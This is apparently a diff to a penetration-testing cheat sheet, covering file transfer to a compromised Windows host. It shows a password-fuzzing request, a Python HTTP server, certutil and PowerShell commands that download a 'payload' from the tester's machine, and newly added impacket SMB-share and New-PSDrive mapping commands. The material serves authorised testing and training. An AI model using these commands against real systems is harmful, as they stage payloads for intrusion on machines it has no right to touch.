@@ -1347,7 +1347,7 @@ username=admin$password=FUZZ
 
 ***
 
-####  [STEP 1] Python Server on Client
+####  [STEP 1] Server on Client
 
 <br />
 
@@ -1360,6 +1360,10 @@ username=admin$password=FUZZ
 sudo python3 -m http.server {PORT}
 
 # {PORT}: Port to open for file transfer
+
+
+# SMB SHARE
+impacket-smbserver temp $(pwd) -smb2support -user {USERNAME} -password {PASSWORD}
 ```
 <br />
 
@@ -1389,7 +1393,13 @@ certutil -split -f -urlcache http://{IP ADDRESS}/{FILE}
 # Windows - Download file using powershell
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{IP ADDRESS}/{FILE.exe}','C:\Users\{USER}\{FILE.exe}')"
 
-# {IP ADDRESS}: IP Address of the client from step one (python server)
+# SMB SHARE
+$pass = convertto-securestring '{PASSWORD}' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('{USERNAME}', $pass)
+New-PSDrive -Name tempdrive -PSProvider FileSystem -Credential $cred -Root \\{IP ADDRESS}\temp
+cd tempdrive:
+
+# {IP ADDRESS}: IP Address of the client from step one
 # {FILE}:       The payload to be transferred
 ```
 <br />
